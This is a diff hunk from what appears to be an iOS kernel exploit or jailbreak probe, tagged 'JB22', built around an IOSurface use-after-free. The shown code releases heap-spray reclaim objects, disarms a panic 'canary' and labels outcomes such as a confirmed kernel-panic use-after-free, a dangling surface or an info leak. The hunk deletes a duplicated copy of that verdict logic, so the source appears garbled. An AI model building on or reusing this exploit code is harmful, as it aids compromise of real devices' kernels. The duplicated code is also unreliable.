@@ -27250,38 +27250,6 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
         else if (danglingCreated && sprayHits > 0) verdict = @"DANGLING_CLIENT_SPRAY_OK";
         else if (danglingCreated) verdict = @"DANGLING_CREATED";
         else if (replantOK > 0) verdict = @"REPLANT_OK_NO_DANGLE";
-                    }
-                    log([NSString stringWithFormat:@"[JB22] Post-reclaim leaks: %d", postReclaimLeaks]);
-
-                    if (reclaimSpray) {
-                        for (int i = 0; i < reclaimCount; i++) {
-                            if (reclaimSpray[i]) CFRelease(reclaimSpray[i]);
-                        }
-                        free(reclaimSpray);
-                    }
-
-                    [ud setObject:@(NO) forKey:@"jb22_trigger_armed"];
-                    [ud synchronize];
-                    log(@"[JB22] Canary desarmado");
-
-                } else {
-                    log([NSString stringWithFormat:@"[JB22] V_REPLANT falló: reg=0x%x dereg=0x%x rereg=0x%x", rR, rD, rRR]);
-                    sym.close(cDangle);
-                }
-            }
-        }
-
-        id prevArmed = [[NSUserDefaults standardUserDefaults] objectForKey:@"jb22_trigger_armed"];
-        int panicDetected = (prevArmed && [prevArmed boolValue]) ? 1 : 0;
-
-        NSString *verdict = @"UNKNOWN";
-        if (panicDetected) verdict = @"KERNEL_PANIC_UAF_CONFIRMED";
-        else if (heapPtrsFound > 0) verdict = @"INFO_LEAK_OR_TYPE_CONFUSION";
-        else if (crossClientHits > 0 && danglingCreated) verdict = @"CROSS_CLIENT_CONFUSION";
-        else if (danglingCreated && surfaceIDFound) verdict = @"DANGLING_SURFACE_TRACKED";
-        else if (danglingCreated && sprayHits > 0) verdict = @"DANGLING_CLIENT_SPRAY_OK";
-        else if (danglingCreated) verdict = @"DANGLING_CREATED";
-        else if (replantOK > 0) verdict = @"REPLANT_OK_NO_DANGLE";
         else verdict = @"PROTECTED";
 
         log([NSString stringWithFormat:@"[JB22] === VEREDICTO: %@ ===", verdict]);
